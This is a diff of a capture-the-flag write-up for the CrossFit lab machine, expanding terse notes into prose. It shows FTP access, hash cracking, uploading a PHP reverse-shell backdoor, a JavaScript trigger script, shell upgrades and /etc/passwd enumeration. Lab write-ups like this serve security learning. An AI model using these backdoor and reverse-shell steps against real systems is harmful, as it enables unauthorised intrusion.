@@ -741,7 +741,7 @@ lftp test3@ftp.crossfit.htb:/> login test3
 Password: 
 ```
 
-Annoyingly, the server seemed to delete my user account after a few minutes.  I had to recreate it and log in again each time.
+Annoyingly, the server seemed to delete my user account after a few minutes.  I had to recreate it and log in again each time during my enumeration.
 
 ```php
 <?php
@@ -765,7 +765,7 @@ lftp test3@ftp.crossfit.htb:/> ls ftp/database/factories/
 lftp test3@ftp.crossfit.htb:/> get ftp/database/factories/UserFactory.php 876 bytes transferred in 1 second (876 B/s)
 ```
 
-database
+In the `ftp/database/factories/` folder there was a file called `UserFactory.php`.  
 
 ```php
 <?php
@@ -798,7 +798,7 @@ $factory->define(User::class, function (Faker $faker) {
 });
 ```
 
-/ftp/database/factories password hash cracked to reveal ... 'password'
+This file contained a password hash, which I loaded into hashcat.  It cracked almost instantly to reveal ... 'password'.  This was most likely a placeholder.
 
 ```text
 lftp test3@ftp.crossfit.htb:/> ls
@@ -808,7 +808,7 @@ drwxr-xr-x    9 0        0            4096 May 12  2020 gym-club
 drwxr-xr-x    2 0        0            4096 May 01  2020 html
 ```
 
-While I was looking at the folder permissions, I realized that the permissions for `/development-test` allowed for writing to the directory.
+While I was looking at the four main folders' permissions, I realized that the permissions for `/development-test` allowed for writing to the directory.
 
 ```text
 lftp test3@ftp.crossfit.htb:/> ls
@@ -824,7 +824,7 @@ lftp test3@ftp.crossfit.htb:/development-test> put ~/php-reverse-shell.php
 ```
 ```
 
-can PUT files, upload php backdoor
+Using the FTP command `PUT` I was able to upload files.  I used this to upload a PHP backdoor that would send me a reverse shell when executed.
 
 ```javascript
 //get and run reverse shell
@@ -842,13 +842,13 @@ request2.send()
 
 ```
 
-Created another script to run my reverse shell
+I once again modified my original JavaScript exploit from earlier, this time simply requesting access to my PHP backdoor.  I hoped that this would execute the code within and send me a reverse shell.  On this one I took a logical leap.  I assumed that since each of the other folders was running a virtually hosted web domain that `development-test` would be the same \(even though there was currently no web page hosted there\).
 
 ```text
 10.10.10.208 - - [15/Jan/2021 22:36:59] "GET /test4.js HTTP/1.1" 200 -
 ```
 
-Got a connection...
+I received a connection request for my JavaScript code, and Burp, which I had used to send the request, showed that the server was stuck while trying to send me a response.  This was good sign as this tends to happen when sending a reverse shell this way.
 
 ## Initial Foothold
 
@@ -881,7 +881,7 @@ www-data@crossfit:/$ export TERM=xterm-256color
 After a little bit of waiting, I got a shell back on my waiting netcat listener!  The first thing I did was upgrade to a full PTY using Python.  
 
 {% hint style="info" %}
-used bash because zsh problem
+Before starting my netcat listener I did some setup.  First I ran the **`script`** command to log all of my commands and output, and I also used **`bash`** because **`zsh`** has a problem \(at least on my system, not sure if it is a confirmed bug\) where backgrounding the connection and setting **`stty raw -echo`** breaks the shell in a way that I cannot use **`enter`** or control key commands.  If anyone has any feedback on this I would appreciate it!
 {% endhint %}
 
 ```text
@@ -904,7 +904,7 @@ www-data 32126  0.0  0.0   3736  2908 ?        S    17:35   0:00 bash -c bash -i
 www-data 32128  0.0  0.0   3868  3220 ?        S    17:35   0:00 bash -i
 ```
 
-Hmm...busy machine...Looked like I had company.
+Hmm...`ps` showed that this was a busy machine...Looked like I had company \(only one of those shells is mine!\).
 
 ```bash
 www-data@crossfit:/run$ cat /etc/passwd
@@ -943,7 +943,7 @@ ftpadm:x:1003:1004::/srv/ftp:/usr/sbin/nologin
 hank:x:1004:1006::/home/hank:/bin/bash
 ```
 
-root, isaac, and hank can login
+I inspected `/etc/passwd` for local user accounts and found that `root`, `isaac`, and `hank` can login with a shell.  These were my most likely targets.
 
 ```text
 www-data@crossfit:/home$ ls -la
@@ -954,7 +954,7 @@ drwxr-xr-x  6 hank  hank  4096 Mar 20 17:24 hank
 drwxr-xr-x  8 isaac isaac 4096 Mar 21 07:19 isaac
 ```
 
-Only two user folders
+In the `/home` directory there were only two user folders: `hank` and `isaac`.
 
 ```text
 www-data@crossfit:/home$ ls -la hank
